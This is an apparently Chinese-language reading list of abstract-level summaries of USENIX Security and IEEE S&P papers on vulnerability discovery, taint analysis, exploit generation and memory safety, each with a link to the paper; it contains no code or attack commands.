&lt;p&gt;​	为了证明我们设计的有效性，我们在Linux上实现了一个名为PUMM的原型系统，它包括一个离线分析器和一个在线强制执行器，通过透明地封装标准库来保护C/C++二进制文件。在我们的评估中，我们对26个程序中的40个真实世界漏洞和3,000个合成漏洞进行了测试，包括像Chakra JavaScript引擎这样的复杂多线程案例。PUMM成功地阻止了所有真实世界的攻击，并仅允许了4个合成攻击，同时将内存开销降低了52.0%并且平均运行时开销仅为2.04%。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjNzdW1tZXJfMTcteWFnZW1hbm4tcHJlcHViLnBkZg==&#34;&gt;sec23summer_17-yagemann-prepub.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Trojan-Source-Invisible-Vulnerabilities&#34;&gt;&lt;a href=&#34;#Trojan-Source-Invisible-Vulnerabilities&#34; class=&#34;headerlink&#34; title=&#34;Trojan Source: Invisible Vulnerabilities&#34;&gt;&lt;/a&gt;&lt;strong&gt;Trojan Source: Invisible Vulnerabilities&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	我们提出了一种新型攻击，即对源代码进行恶意编码，使其在编译器和人眼看来有所不同。这种攻击利用文本编码标准（如 Unicode）中的微妙之处产生源代码，其标记的逻辑编码顺序与显示顺序不同，从而导致人类代码审查员无法直接感知的漏洞。我们称之为 “源代码木马 “攻击，它对第一方软件和整个行业的供应链破坏都构成了直接威胁。我们介绍了 C、C++、C#、JavaScript、Java、Rust、Go、Python SQL、Bash、Assembly 和 Solidity 中的源代码木马攻击实例。我们提出了明确的编译器级防御措施，并介绍了可在编译器升级时部署到编辑器、资源库和构建流水线中的其他缓解控制措施，以阻止这种攻击。我们记录了针对这些漏洞的全行业协同披露；由于这些漏洞影响了大多数编译器、编辑器和软件源，因此我们通过这次演习了解了不同公司、开源社区和其他利益相关者如何应对漏洞披露。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy1ib3VjaGVyLnBkZg==&#34;&gt;usenixsecurity23-boucher.pdf&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs&#34;&gt;&lt;a href=&#34;#Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs&#34; class=&#34;headerlink&#34; title=&#34;Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs&#34;&gt;&lt;/a&gt;&lt;strong&gt;Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;尽管目前最先进的二进制程序分析方法在发现漏洞方面非常有效，但其准确性和可扩展性之间的固有权衡限制了这些方法的发展。在本文中，我们确定了一系列可帮助静态和动态漏洞检测技术的漏洞属性，提高了前者的精确性和后者的可扩展性。通过精心整合静态和动态技术，我们在真实世界的程序中大规模地检测出了表现出这些特性的漏洞。&lt;/p&gt;
&lt;p&gt;我们实施了我们的技术，在分析二进制代码方面取得了一些进展，并创建了一个名为 ARBITER 的原型。我们通过对四类常见漏洞的大规模评估，证明了我们方法的有效性： CWE-131（缓冲区大小计算错误）、CWE-252（未检查的返回值）、CWE-134（未控制的格式字符串）和 CWE-337（伪随机数生成器中的可预测种子）。我们在 Ubuntu 软件仓库中超过 76516 个 x86-64 二进制文件上评估了我们的方法，发现了新的漏洞，包括一个在编译过程中插入程序的漏洞。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjItdmFkYXlhdGgucGRm&#34;&gt;sec22-vadayath.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients&#34;&gt;&lt;a href=&#34;#Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients&#34; class=&#34;headerlink&#34; title=&#34;Fine Grained Dataflow Tracking with Proximal Gradients&#34;&gt;&lt;/a&gt;&lt;strong&gt;Fine Grained Dataflow Tracking with Proximal Gradients&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	使用动态污点分析（DTA）进行数据流跟踪是系统安全领域的一种重要方法，有很多应用，包括漏洞分析、引导模糊和侧信道信息泄漏检测。然而，DTA 从根本上受到污点标签布尔性质的限制，无法提供有关检测到的数据流重要性的信息，导致在复杂的真实世界程序中出现假阳性/阴性。&lt;/p&gt;
&lt;p&gt;​	我们引入了近端梯度分析（PGA），这是一种基于理论的新方法，可以跟踪更准确、更精细的数据流信息。PGA 使用近似梯度（一种对无差异函数梯度的概括）来对程序中的无差异操作进行精确梯度组合。在程序上组合梯度消除了 DTA 中出现的许多数据流传播错误，并提供了有关每个测量数据流如何影响程序的更丰富信息。&lt;/p&gt;
&lt;p&gt;​	我们在 7 个实际程序上将 PGA 原型实现与三种最先进的 DTA 实现进行了比较。结果表明，与污点跟踪（平均 20%）相比，PGA 可以将数据流跟踪的 F1 精确度提高 33%，而不会带来任何显著的开销（平均 &amp;lt; 5%）。我们发现了 22 个漏洞（20 个经开发人员确认）和 2 个侧信道泄漏，并在测试程序中的 19 个现有 CVE 中识别出了可利用的数据流，从而进一步证明了 PGA 的有效性。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtcnlhbi5wZGY=&#34;&gt;sec21-ryan.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;maze-Towards-Automated-Heap-Feng-Shui&#34;&gt;&lt;a href=&#34;#maze-Towards-Automated-Heap-Feng-Shui&#34; class=&#34;headerlink&#34; title=&#34;maze: Towards Automated Heap Feng Shui&#34;&gt;&lt;/a&gt;&lt;strong&gt;maze: Towards Automated Heap Feng Shui&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	大量内存损坏漏洞，例如堆溢出和释放后使用（UAF），只能通过堆风水等技术在特定堆布局中利用。为了给自动生成漏洞利用程序（AEG）铺平道路，需要对堆布局进行自动操作。&lt;/p&gt;
&lt;p&gt;​	在本文中，我们提出了一种新型解决方案 MAZE，用于操作概念验证 (POC) 样本的堆布局。它首先识别堆布局基元（即输入片段或代码片段），供用户操作堆。然后，它应用一种新颖的 “挖掘与填充 “算法（Dig &amp;amp; Fill algorithm），该算法将问题建模为线性二叉方程（Linear Diophantine Equation）并进行确定性求解，从而推断出能够生成目标堆布局的基元操作序列。&lt;/p&gt;
&lt;p&gt;​	我们在分析引擎 S2E 的基础上实现了 MAZE 的原型，并在 PHP、Python 和 Perl 解释器、一组 CTF（夺旗）程序以及大型微基准测试中对其进行了评估。结果表明，MAZE 可以为超过 90% 的程序生成预期的堆布局。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtd2FuZy15YW4ucGRm&#34;&gt;sec21-wang-yan.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting&#34;&gt;&lt;a href=&#34;#SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting&#34; class=&#34;headerlink&#34; title=&#34;SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting&#34;&gt;&lt;/a&gt;SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting&lt;/h3&gt;&lt;p&gt;污点分析已被广泛应用于许多安全应用中，如漏洞检测、信息流跟踪、恶意软件分析和协议逆向工程。最先进的污点分析工具通常建立在动态二进制仪表之上，对每一条可能的指令进行检测，并依赖运行时信息来判断特定指令是否涉及污点，因此通常会产生很高的性能开销。本文介绍了针对二进制可执行文件的高效选择性污点分析框架 SelectiveTaint。其主要思想是利用静态二进制重写代替动态二进制工具，选择性地对涉及污点分析的指令进行工具化。在高层次上，SelectiveTaint 会静态扫描二进制代码中感兴趣的污点源，利用值集分析保守地确定指令操作数是否需要污点分析，然后选择性地对感兴趣的指令进行污点分析。我们实现了 SelectiveTaint，并用一组二进制程序对其进行了评估，其中包括 16 个 coreutils（侧重于文件 I/O）和 5 个网络守护程序（侧重于网络 I/O），如 nginx 网络服务器。评估结果表明，与最先进的动态污点分析框架相比，SelectiveTaint 静态检测的二进制程序性能更优越（例如，比 libdft 快 1.7 倍）。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtY2hlbi1zYW5jaHVhbi5wZGY=&#34;&gt;sec21-chen-sanchuan.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation&#34;&gt;&lt;a href=&#34;#MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation&#34; class=&#34;headerlink&#34; title=&#34;MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation&#34;&gt;&lt;/a&gt;&lt;strong&gt;MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	混合布尔算术 (MBA) 混淆是一种执行从简单表达式到难以理解和分析的表示的语义保留转换的方法。 更具体地说，这种混淆技术由算术运算（例如 ADD 和 IMUL）和布尔运算（例如 AND、OR 和 NOT）的混合使用组成。 经过 MBA 混淆的二进制代码可以有效地隐藏静态和动态逆向工程中的秘密数据/算法，包括利用 SMT 求解器的高级分析。 不幸的是，针对 MBA 的反混淆研究仍处于起步阶段：最先进的解决方案（例如模式匹配、位爆破和程序合成）要么遭受严重的性能损失，要么是为特定的 MBA 模式设计的，要么生成太多的代码。 在实践中会导致错误的简化。&lt;/p&gt;
&lt;p&gt;​	在本文中，我们首先揭秘 MBA 混淆的底层机制。 我们的深入研究揭示了 1 位变量和 n 位变量之间 MBA 转换的隐藏双向特征。 我们利用这一特性并提出了一种可行的解决方案，通过 MBA 混淆来有效地反混淆代码。 我们的主要见解是 MBA 转换在 1 位和 n 位变量上的行为方式相同。 我们提供了数学证明来保证这一发现的正确性。 我们进一步开发了一种新技术，通过 1 位空间的算术缩减将 MBA 表达式简化为正常的简单形式。 我们将这个想法实现为一个名为 MBA-Blast 的开源原型，并在包含约 10,000 个 MBA 表达式的综合数据集上对其进行了评估。 我们还在现实世界的二进制代码反混淆场景中测试了我们的方法，这表明 MBA-Blast 可以帮助人类分析师充分利用 SMT 求解器的优势。 与现有工作相比，MBA-Blast 是最通用、最高效的 MBA 反混淆技术； 它具有坚实的理论基础，并且成功率最高，而开销可以忽略不计。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtbGl1LWJpbmJpbi5wZGY=&#34;&gt;sec21-liu-binbin.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;VScape-Assessing-and-Escaping-Virtual-Call-Protections&#34;&gt;&lt;a href=&#34;#VScape-Assessing-and-Escaping-Virtual-Call-Protections&#34; class=&#34;headerlink&#34; title=&#34;VScape: Assessing and Escaping Virtual Call Protections&#34;&gt;&lt;/a&gt;&lt;strong&gt;VScape: Assessing and Escaping Virtual Call Protections&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	许多控制流完整性（CFI）解决方案已被提出，用于保护间接控制传递（ICT），包括C++虚函数调用。评估这些防御方案的安全性保证是重要但困难的。在实践中，对于一个（强）防御方案，通常需要大量的手工工作来评估在给定特定（弱）漏洞时是否可以被绕过。现有的自动化利用生成解决方案，用于评估漏洞的可利用性，尚未解决这个问题。&lt;/p&gt;
&lt;p&gt;​	在本文中，我们指出了一系列不破坏C++ ABI（应用程序二进制接口）的虚函数保护方案容易受到先进的COOPLUS攻击的威胁，即使给定的漏洞很弱。然后，我们提出了一个名为VScape的解决方案，用于评估虚函数保护方案对这种攻击的有效性。我们开发了VScape的原型，并利用它评估了11个CFI解决方案和14个包含Firefox和PyQt在内的C++应用程序的已知漏洞。结果表明，现实世界的应用程序存在大量可利用的虚函数调用，并且VScape可以用于生成可绕过已部署防御方案的工作利用程序，通过利用弱漏洞实现绕过。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtY2hlbi1rYWl4aWFuZy5wZGY=&#34;&gt;sec21-chen-kaixiang.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs&#34;&gt;&lt;a href=&#34;#Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs&#34; class=&#34;headerlink&#34; title=&#34;Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs&#34;&gt;&lt;/a&gt;&lt;strong&gt;Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	压缩垃圾收集(compact-gc)是一种通过重新安排活动对象和使用地址表更新其引用来提高内存利用率和减少内存碎片的方法。如果在compact-gc之后使用了未在地址表中注册的对象引用，则可能存在严重的use-after-free错误，因为活动对象可能会移动，但在compact-gc之后不会更新引用。我们将此称为use-after-compact-gc (use-after-cgc)错误。以前的工具已经尝试使用特定于目标的启发式方法静态地检测这些错误。然而，由于它们的路径不敏感分析和不精确的目标特异性启发式，它们有很高的假阳性和假阴性。&lt;/p&gt;
&lt;p&gt;​	在本文中，我们提出了一个精确的、可扩展的静态分析器CGSan，用于查找use-after-cgc错误。CGSan通过过程内静态符号污染分析检测cgc后使用的候选错误，并通过约束不足的定向符号执行检查它们的可行性。为了减轻过程内分析的不完整性，我们采用了基于类型的污染策略。对于可扩展性，我们建议使用定向过程间控制流图，它通过排除与检查可行性无关的路径来减少搜索空间，以及定向调度，它优先考虑路径以快速检查可行性。我们在Google V8和Mozilla SpiderMonkey上评估了CGSan，我们发现了13个独特的使用后cgc错误，只有2个假阳性，而之前的两个工具遗漏了10个错误，总共有34个假阳性.&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtaGFuLWh5dW5nc2Vvay5wZGY=&#34;&gt;sec21-han-hyungseok.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems&#34;&gt;&lt;a href=&#34;#FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems&#34; class=&#34;headerlink&#34; title=&#34;FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems&#34;&gt;&lt;/a&gt;&lt;strong&gt;FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	动态信息流分析(DIFA)支持各种安全应用，如恶意软件分析和漏洞发现。然而，由于适用性、可移植性和可伸缩性方面的障碍，传统的DIFA方法对分布式软件的效用有限。我们提出了FlowDist，这是一个通用分布式软件的DIFA，可以克服这些挑战。FlowDist工作在纯应用程序级别，避免了平台定制，因此实现了高可移植性。它从全局部分顺序执行事件中推断出隐式的进程间依赖关系，以解决分布式软件的适用性。最重要的是，它为应用程序级DIFA引入了一种基于多阶段细化的方案，在这种方案中，通过廉价的预分析产生的方法级结果减少了昂贵的数据流分析，从而在保持有效性的同时实现了高可伸缩性。我们在12个真实的分布式系统上对FlowDist与两种同类工具进行了评估，结果显示其在实际效率和可扩展性方面具有卓越的有效性。它发现了18个已知漏洞和24个新漏洞，其中17个已确认，2个已修复。我们还提出并评估了FlowDist的两种替代设计，包括设计理由和不同的主题住宿。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtZnUteGlhb3Fpbi5wZGY=&#34;&gt;sec21-fu-xiaoqin.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Symbolic-execution-with-SymCC-Don’t-interpret-compile&#34;&gt;&lt;a href=&#34;#Symbolic-execution-with-SymCC-Don’t-interpret-compile&#34; class=&#34;headerlink&#34; title=&#34;Symbolic execution with SymCC: Don’t interpret, compile!&#34;&gt;&lt;/a&gt;&lt;strong&gt;Symbolic execution with SymCC: Don’t interpret, compile!&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	实际符号执行的主要障碍是速度，特别是与模糊测试等接近本地速度的解决方案相比。我们提出了一种基于编译的符号执行方法，其性能优于最先进的实现数量级。我们介绍了SymCC，这是一个基于llvm的C和c++编译器，它将concolic执行构建到二进制文件中。它可以被软件开发人员用作clang和clang++的临时替代品，并且我们展示了如何轻松地添加对其他语言的支持。与KLEE相比，SymCC的速度快了三个数量级，平均快了12个数量级。它的性能也优于Qsym, Qsym是一个最近表现出比其他实现有很大性能改进的系统，最高可达两个数量级，平均为10倍。在真实的软件上使用它，我们发现我们的方法始终达到更高的覆盖率，并且我们在经过大量测试的OpenJPEG项目中发现了两个漏洞，这些漏洞已经被项目维护者确认并分配了CVE标识符。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtcG9lcGxhdS5wZGY=&#34;&gt;sec20-poeplau.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Everything-Old-is-New-Again-Binary-Security-of-WebAssembly&#34;&gt;&lt;a href=&#34;#Everything-Old-is-New-Again-Binary-Security-of-WebAssembly&#34; class=&#34;headerlink&#34; title=&#34;Everything Old is New Again: Binary Security of WebAssembly&#34;&gt;&lt;/a&gt;&lt;strong&gt;Everything Old is New Again: Binary Security of WebAssembly&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	WebAssembly是一种越来越流行的编译目标，通过严格分离代码和数据、强制类型和限制间接控制流，它被设计成在浏览器和其他平台上安全运行代码。尽管如此，内存不安全源语言中的漏洞可能会转化为WebAssembly二进制文件中的漏洞。在本文中，我们分析了WebAssembly二进制文件中的漏洞可被利用的程度，以及与本机代码的比较。我们发现许多经典的漏洞，由于常见的缓解措施，在原生二进制文件中不再被利用，在WebAssembly中完全暴露出来。此外，WebAssembly支持独特的攻击，例如覆盖假定的常量数据或使用堆栈溢出操作堆。我们提出了一组攻击原语，使攻击者能够(i)写入任意内存，(ii)覆盖敏感数据，以及(iii)通过转移控制流或操纵主机环境来触发意外行为。我们提供了一组易受攻击的概念验证应用程序以及完整的端到端漏洞，涵盖了三个WebAssembly平台。对编译到WebAssembly的实际二进制文件和SPEC CPU程序的经验风险评估表明，我们的攻击原语在实践中可能是可行的。总的来说，我们的发现显示WebAssembly中可能令人惊讶地缺乏二进制安全性。我们讨论了潜在的保护机制，以减轻由此产生的风险。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtbGVobWFubi5wZGY=&#34;&gt;sec20-lehmann.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation&#34;&gt;&lt;a href=&#34;#AURORA-Statistical-Crash-Analysis-for-Automated-Root-Cause-Explanation&#34; class=&#34;headerlink&#34; title=&#34;AURORA: Statistical Crash Analysis for Automated Root Cause Explanation&#34;&gt;&lt;/a&gt;&lt;strong&gt;AURORA: Statistical Crash Analysis for Automated Root Cause Explanation&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	鉴于自动化软件测试技术的巨大成功，在实践中发现了大量的崩溃。确定崩溃的根本原因是一项耗时的工作，会导致发现崩溃和修复底层软件故障之间的不平衡。为了解决这个问题，已经提出了依赖于诸如反向执行和向后污染分析等技术的各种方法。然而，这些技术要么局限于特定的故障类型，要么向分析人员提供组装指令，但没有上下文信息或对潜在故障的解释。&lt;/p&gt;
&lt;p&gt;​	在本文中，我们提出了一种自动化分析方法，它不仅可以识别给定二进制可执行文件的崩溃输入的根本原因，还可以为分析人员提供有关崩溃输入特征的错误行为的上下文信息。从单个崩溃输入开始，我们生成一组不同的类似输入，这些输入要么使程序崩溃，要么诱发良性行为。然后，我们在执行每个找到的输入时跟踪程序的状态，并生成谓词，即捕获崩溃和非崩溃输入之间的行为差异的简单布尔表达式。对所有谓词的统计分析使我们能够确定确定根本原因的谓词，从而不仅揭示了根本原因的位置，而且还向分析人员提供了在该位置显示的崩溃行为的解释。我们在一个叫做AURORA的工具中实现了我们的方法，并对25个不同的软件故障进行了评估。我们的评估表明，AURORA甚至能够发现复杂bug的根本原因。例如，在开发人员修复和崩溃位置之间执行了数百万条指令的情况下，它成功了。与现有方法相比，AURORA还能够处理根本原因与崩溃之间没有数据依赖关系的错误，例如类型混淆错误。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjBmYWxsX2JsYXp5dGtvX3ByZXB1Yi5wZGY=&#34;&gt;sec20fall_blazytko_prepub.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities&#34;&gt;&lt;a href=&#34;#KOOBE-Towards-Facilitating-Exploit-Generation-of-Kernel-Out-Of-Bounds-Write-Vulnerabilities&#34; class=&#34;headerlink&#34; title=&#34;KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities&#34;&gt;&lt;/a&gt;&lt;strong&gt;KOOBE: Towards Facilitating Exploit Generation of Kernel Out-Of-Bounds Write Vulnerabilities&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	现代操作系统内核的整体性导致不断发现错误。 通常不清楚哪些错误值得修复，因为只有其中一部分可能严重到足以导致安全接管（即权限升级）。 因此，研究人员最近开始开发自动漏洞利用生成技术（针对 UAF bug）来协助 bug 分类过程。 在本文中，我们研究了 Linux 内核中的另一个顶级内存漏洞——堆中的越界（OOB）内存写入。 我们基于以下两个观察结果设计 KOOBE 来协助分析此类漏洞：(1) 令人惊讶的是，不同的 OOB 漏洞实例常常表现出广泛的功能。 (2) 内核漏洞利用本质上是多重交互的（即，漏洞利用涉及多个系统调用），这使得漏洞利用制作过程可以模块化。 具体来说，我们专注于提取 OOB 漏洞的功能，这将为后续的可利用性评估过程提供支持。 我们的系统构建在多个构建块上，包括用于发现隐藏功能的新型功能引导模糊解决方案，以及将功能组合在一起以进一步提高成功利用的可能性的方法。 在我们的评估中，我们通过详尽分析 17 个最新的 Linux 内核 OOB 漏洞（其中只有 5 个具有公开可用的漏洞）来证明 KOOBE 的适用性，其中 KOOBE 成功为其中 11 个漏洞生成了候选漏洞利用策略（包括 5 个没有公开的漏洞） 甚至分配了任何 CVE）。 随后，根据这些策略，我们能够为所有这些策略构建完全有效的漏洞利用。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtY2hlbi13ZWl0ZW5nLnBkZg==&#34;&gt;sec20-chen-weiteng.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives&#34;&gt;&lt;a href=&#34;#Automatic-Techniques-to-Systematically-Discover-New-Heap-Exploitation-Primitives&#34; class=&#34;headerlink&#34; title=&#34;Automatic Techniques to Systematically Discover New Heap Exploitation Primitives&#34;&gt;&lt;/a&gt;&lt;strong&gt;Automatic Techniques to Systematically Discover New Heap Exploitation Primitives&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;滥用堆分配器元数据的利用技术因其通用性（即独立于应用程序）和强大功能（即绕过现代缓解措施）而被广泛研究。然而，这些技术通常被认为是艺术，因此发现它们的方法仍然是临时的、手动的和针对特定分配器的。&lt;/p&gt;
&lt;p&gt;在本文中，我们提出了一种自动工具 ArcHeap，用于系统地发现尚未开发的堆利用原语，而不管它们的底层实现是什么。ArcHeap 的主要理念是让计算机自主探索空间，其概念类似于模糊测试，方法是指定一组现代堆分配器的常见设计和漏洞根源作为模型，并提供堆操作和攻击能力作为动作。在探索过程中，ArcHeap 会检查这些操作的组合是否有可能用于构建漏洞利用原语，如任意写入或重叠块。作为证明，ArcHeap 会生成工作 PoC，演示所发现的利用技术。&lt;/p&gt;
&lt;p&gt;我们用 ptmalloc2 和其他 10 个分配器对 ArcHeap 进行了评估，在 ptmalloc2 中发现了 5 种以前未知的利用技术，并针对 10 个分配器中的 7 个（包括注重安全的分配器 DieHarder）发现了几种利用技术。为了证明 ArcHeap 方法在其他领域的有效性，我们还研究了安全特性和利用原语是如何在不同版本的 ptmalloc2 中演变的。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAteXVuLnBkZg==&#34;&gt;sec20-yun.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;S-amp-P&#34;&gt;&lt;a href=&#34;#S-amp-P&#34; class=&#34;headerlink&#34; title=&#34;S&amp;amp;P&#34;&gt;&lt;/a&gt;S&amp;amp;P&lt;/h2&gt;&lt;h3 id=&#34;Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware&#34;&gt;&lt;a href=&#34;#Karonte-Detecting-Insecure-Multi-binary-Interactions-in-Embedded-Firmware&#34; class=&#34;headerlink&#34; title=&#34;Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware&#34;&gt;&lt;/a&gt;Karonte: Detecting Insecure Multi-binary Interactions in Embedded Firmware&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;基于污点分析的多二进制文件之间交互过程漏洞挖掘&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTE1Mjc5Ng==&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=9152796&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;SAVIOR-Towards-Bug-Driven-Hybrid-Testing&#34;&gt;&lt;a href=&#34;#SAVIOR-Towards-Bug-Driven-Hybrid-Testing&#34; class=&#34;headerlink&#34; title=&#34;SAVIOR: Towards Bug-Driven Hybrid Testing&#34;&gt;&lt;/a&gt;SAVIOR: Towards Bug-Driven Hybrid Testing&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;传统的模糊测试加混合执行的方法会测试许多无意义的代码路径，SAVIOR能够推理出漏洞的可行性，筛选出更可行的程序执行路径。&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL3N0YW1wL3N0YW1wLmpzcD90cD0mYXJudW1iZXI9OTE1MjY4Mg==&#34;&gt;https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;amp;arnumber=9152682&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis&#34;&gt;&lt;a href=&#34;#Goshawk-Hunting-Memory-Corruptions-via-Structure-Aware-and-Object-Centric-Memory-Operation-Synopsis&#34; class=&#34;headerlink&#34; title=&#34;Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis&#34;&gt;&lt;/a&gt;Goshawk: Hunting Memory Corruptions via Structure-Aware and Object-Centric Memory Operation Synopsis&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用自然语言处理和数据流分析等技术来对内存管理函数进行抽象，从而有效地检测定制化内存管理机制造成的内存破坏缺陷&lt;/p&gt;
&lt;/li&gt;
